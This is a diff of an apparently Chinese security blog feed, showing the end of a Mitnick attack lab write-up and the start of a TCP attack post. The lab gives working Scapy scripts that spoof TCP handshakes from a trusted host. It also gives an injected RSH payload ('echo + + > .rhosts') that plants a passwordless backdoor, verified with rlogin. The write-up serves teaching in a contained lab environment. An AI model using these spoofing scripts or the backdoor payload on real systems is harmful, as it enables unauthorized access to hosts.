+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_port2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;# can be any number&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;# Set the SYN + ACK bits&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;c1&#34;&gt;####################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tcp and src host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and dst port &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_port2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sniff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;br-302e4ba285b3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;终端 3 运行 &lt;code&gt;spoof_syn.py&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; volumes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 spoof_syn.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这个脚本负责向 X-Terminal 发送伪造的 SYN 包，触发整个攻击流程。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.5&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_ip&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.6&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# The trusted server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x_port&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;514&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;# Port number used by X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_port&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1023&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# Port number used by the trusted server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;port_2nd&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9090&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# Port number used by the 2nd connection&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;syn_seq&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;# Initial sequence number &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Spoof a SYN from Trusted Server to X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x_port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           &lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syn_seq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;S&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Sending SYN...&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;4.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;h3 id=&#34;验证攻击结果&#34;&gt;验证攻击结果
+&lt;/h3&gt;&lt;p&gt;回到受害者容器中检查 &lt;code&gt;/tmp/mitnick&lt;/code&gt; 文件是否生成，这里可以看到文件说明攻击者成功伪造服务器身份并注入了命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -l /tmp/mitnick
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;5.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;h2 id=&#34;设置永久后门&#34;&gt;设置永久后门
+&lt;/h2&gt;&lt;p&gt;前面的攻击只是创建了一个文件。为了进一步利用受害者，攻击者可以通过注入命令修改 &lt;code&gt;.rhosts&lt;/code&gt; 文件来植入永久后门&lt;/p&gt;
+&lt;h3 id=&#34;修改攻击载荷&#34;&gt;修改攻击载荷
+&lt;/h3&gt;&lt;p&gt;在攻击机中修改 &lt;code&gt;spoof_ack_plus_data.py&lt;/code&gt; 的数据部分，将原来的 &lt;code&gt;touch&lt;/code&gt; 命令替换为修改 &lt;code&gt;.rhosts&lt;/code&gt; 的命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;srv_port2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;echo + + &amp;gt; .rhosts&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;+ +&lt;/code&gt; 表示信任任意主机上的任意用户。这个配置非常危险，一旦写入成功，攻击者就可以直接登录受害主机&lt;/p&gt;
+&lt;h3 id=&#34;重新执行攻击流程&#34;&gt;重新执行攻击流程
+&lt;/h3&gt;&lt;p&gt;重新运行前面的三个攻击脚本：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 spoof_ack_plus_data.py
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 spoof_syn_ack_2nd.py
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 spoof_syn.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;攻击完成后，回到攻击机容器中切换到 &lt;code&gt;seed&lt;/code&gt; 用户，并尝试直接登录 X-Terminal：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;su seed
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rlogin 10.9.0.5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果无需密码即可进入 &lt;code&gt;10.9.0.5&lt;/code&gt; 的 Shell，说明后门已经植入成功。&lt;/p&gt;
+&lt;img src=&#34;6.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;进入后可以查看 &lt;code&gt;.rhosts&lt;/code&gt; 文件内容：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;more .rhosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果文件内容变成：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ +
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;说明 X-Terminal 的信任策略已经被篡改，攻击者获得了对受害主机的直接访问权限。&lt;/p&gt;
+&lt;img src=&#34;7.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;h2 id=&#34;实验结论&#34;&gt;实验结论
+&lt;/h2&gt;&lt;p&gt;Mitnick 攻击利用了早期 TCP 协议和基于主机信任机制的安全缺陷。攻击者先让真实 Trusted Server 静默，再伪造其 IP 地址与 X-Terminal 建立连接，通过预测 TCP 序列号完成伪造握手，最后借助 RSH 协议注入命令。&lt;/p&gt;
+&lt;p&gt;这个实验可以看出，单纯依赖 IP 地址和主机信任关系进行认证是不安全的。攻击者只要能够伪造源 IP 并预测连接状态，就可能绕过登录认证。&lt;/p&gt;
+&lt;p&gt;RSH、RLOGIN 这类协议本身缺乏加密和强认证机制，已经不适合在真实环境中使用。实际环境中应使用 SSH 替代，并关闭 &lt;code&gt;.rhosts&lt;/code&gt;、&lt;code&gt;hosts.equiv&lt;/code&gt; 这类基于主机信任的认证方式。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>TCP协议攻击</title>
         <link>https://th4uma.github.io/post/tcp/</link>
         <pubDate>Mon, 25 May 2026 22:08:02 +0800</pubDate>
         
         <guid>https://th4uma.github.io/post/tcp/</guid>
         <description>&lt;img src="https://th4uma.github.io/images/cover/tcp.jpg" alt="Featured image of post TCP协议攻击" /&gt;&lt;h2 id=&#34;实验环境&#34;&gt;实验环境
-&lt;/h2&gt;&lt;h3 id=&#34;容器&#34;&gt;容器
-&lt;/h3&gt;&lt;p&gt;我使用的是 Ubuntu  24.04.4，基本环境配置见&lt;a class=&#34;link&#34; href=&#34;https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;/h2&gt;&lt;p&gt;我使用的是 Ubuntu  24.04.4，基本环境配置见&lt;a class=&#34;link&#34; href=&#34;https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;ARP攻击原理学习&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;启动实验前，对容器环境进行清理，避免之前的网络配置干扰&lt;/p&gt;
+&lt;p&gt;网络结构如下：&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;节点&lt;/th&gt;
+					&lt;th&gt;IP 地址&lt;/th&gt;
+					&lt;th&gt;作用&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;攻击者&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.1&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;发送伪造 TCP 报文进行攻击&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;受害者&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.5&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;被攻击的 Telnet 客户端&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;用户&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.6&lt;/code&gt;&lt;/td&gt;
